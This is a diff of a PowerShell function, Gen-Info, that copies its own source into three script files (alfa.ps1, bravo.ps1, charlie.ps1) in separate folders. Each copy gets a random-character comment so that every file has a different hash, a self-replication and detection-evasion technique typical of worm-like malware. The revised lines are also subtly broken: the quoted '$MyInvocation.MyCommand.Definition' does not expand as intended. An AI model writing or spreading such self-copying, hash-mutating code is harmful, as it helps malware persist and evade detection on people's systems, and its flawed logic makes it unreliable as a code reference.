@@ -6,20 +6,26 @@ function Gen-Info {
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     if (-not (Test-Path "$alfa_path\alfa.ps1")) {
-        $MyInvocation.MyCommand.Definition | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
+        Set-Content -Path "$alfa_path\alfa.ps1" -Value "function Gen-Info {"
+        Add-Content -Path "$alfa_path\alfa.ps1" -Value "$MyInvocation.MyCommand.Definition"
         Add-Content -Path "$alfa_path\alfa.ps1" -Value "# $random_chars"
+        Add-Content -Path "$alfa_path\alfa.ps1" -Value "}"
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     if (-not (Test-Path "$bravo_path\bravo.ps1")) {
-        $MyInvocation.MyCommand.Definition | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
+        Set-Content -Path "$bravo_path\bravo.ps1" -Value "function Gen-Info {"
+        Add-Content -Path "$bravo_path\bravo.ps1" -Value "$MyInvocation.MyCommand.Definition"
         Add-Content -Path "$bravo_path\bravo.ps1" -Value "# $random_chars"
+        Add-Content -Path "$bravo_path\bravo.ps1" -Value "}"
     }
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     if (-not (Test-Path "$charlie_path\charlie.ps1")) {
-        $MyInvocation.MyCommand.Definition | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
+        Set-Content -Path "$charlie_path\charlie.ps1" -Value "function Gen-Info {"
+        Add-Content -Path "$charlie_path\charlie.ps1" -Value "$MyInvocation.MyCommand.Definition"
         Add-Content -Path "$charlie_path\charlie.ps1" -Value "# $random_chars"
+        Add-Content -Path "$charlie_path\charlie.ps1" -Value "}"
     }
     
     
